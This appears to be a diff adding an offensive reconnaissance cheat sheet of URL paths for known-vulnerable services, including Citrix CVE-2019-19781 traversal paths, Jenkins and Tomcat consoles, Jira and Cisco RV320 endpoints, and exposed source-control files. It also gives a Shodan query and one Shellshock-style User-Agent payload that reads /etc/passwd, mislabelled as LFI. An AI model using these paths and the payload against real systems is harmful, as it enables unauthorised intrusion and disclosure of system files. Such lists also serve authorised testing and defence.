@@ -1,0 +1,77 @@
+####################
+##
+##
+## VULN URI'S / CVE's:
+##
+##
+####################
+
+### shodan query:
+html:<URI>
+
+# wordpress:
+/wp-admin
+/wp/
+
+# LFI
+/cgi-bin/ // crawl w burp, check "GET /cgi-bin/status", send to repeater, replace user agent with { :;}; echo $(</etc/passwd)
+
+# Sensitive info disclosure
+/__clockwork
+
+# Edge Stack
+/edge_stack/admin/
+
+# CVE-2019-7305 // world accessible directories over HTTP
+/etc/extplorer/
+/usr/
+
+# RDP Web:
+/RDWeb/
+
+#vBulletin:
+/vbulletin
+
+# java:
+/index.jsf
+
+# pulse secure:
+/dana-na/
+
+# citrix cve-2019-19781
+/vpn/../vpns/portal/scripts/
+/vpn/../vpns/portal/
+/vpns/portal/
+/vpn/../vpns/cfg/
+/vpns/portal/scripts/
+
+# tomcat manager:
+/manager/html
+
+# Jenkins:
+/script
+/jenkins/script
+/signup
+
+# Cisco RV320 Router RCE:
+/cgi-bin/config.exp
+
+# Jira:
+/secure/ConfigureReport.jspa
+/secure/ConfigureReport!default.jspa
+/secure/attachmentzip/
+/secure/ContactAdministrators!default.jspa # CVE-2019–11581
+
+# Aspera
+/ops/transfers
+
+# SVN Entries // allows possible source code DL
+/.svn/entries
+/CVS/Entries
+
+# phpMyAdmin
+/pma
+/phpmyadmin
+
+# sql
+/sqladmin
